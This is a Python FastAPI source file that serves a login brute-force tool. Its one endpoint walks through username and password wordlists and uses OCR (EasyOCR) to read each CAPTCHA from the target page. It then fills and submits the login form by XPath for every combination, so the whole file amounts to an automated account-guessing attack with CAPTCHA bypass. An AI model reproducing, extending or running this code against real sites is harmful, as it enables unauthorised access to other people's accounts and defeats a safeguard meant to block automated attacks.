from fastapi import FastAPI
from api.models.data_structure import Data
from captcha_solver.captcha_getter import CaptchaDownloader
from captcha_solver.file_reader import FileReader
from captcha_solver.image_processing import DSP
from captcha_solver.easyocr_implement import MyEasyOCR

app = FastAPI()


@app.post("/captcha_reader/", tags=["login-brute-force"])
async def root(data: Data):
    data_dict = data.dict()
    file = FileReader(file_path=data_dict["user_input_file"])
    captcha = CaptchaDownloader(url=data_dict["url"])

    for user in file.text_reader():
        if data_dict["password_input_file"]:
            password_file = FileReader(file_path=data_dict["password_input_file"])

            for password in password_file.text_reader():
                captcha.captcha_downloader(data_dict["captcha_image_xpath"])
                dsp = DSP()
                image = dsp.image_editor(dsp.get_color()[0]["start"], dsp.get_color()[0]["end"])
                captcha_data = MyEasyOCR(image, data_dict["gpu_mode"], data_dict["captcha_language"])

                captcha.user_sender(user_xpath=data_dict["user_xpath"], user=user)
                captcha.password_sender(password_input_xpath=data_dict["password_xpath"], password_data=password)
                captcha.captcha_sender(captcha_input_xpath=data_dict["captcha_input_xpath"],
                                       captcha_data=captcha_data.easy_result())
                captcha.submit(data_dict["submit_xpath"])
        else:
            captcha.captcha_downloader(data_dict["captcha_image_xpath"])
            dsp = DSP()
            image = dsp.image_editor(dsp.get_color()[0]["start"], dsp.get_color()[0]["end"])
            captcha_data = MyEasyOCR(image=image, gpu_mode=data_dict["gpu_mode"],
                                     language=data_dict["captcha_language"])

            captcha.user_sender(user_xpath=data_dict["user_xpath"], user=user)
            captcha.captcha_sender(captcha_input_xpath=data_dict["captcha_input_xpath"],
                                   captcha_data=captcha_data.easy_result())
            captcha.submit(data_dict["submit_xpath"])
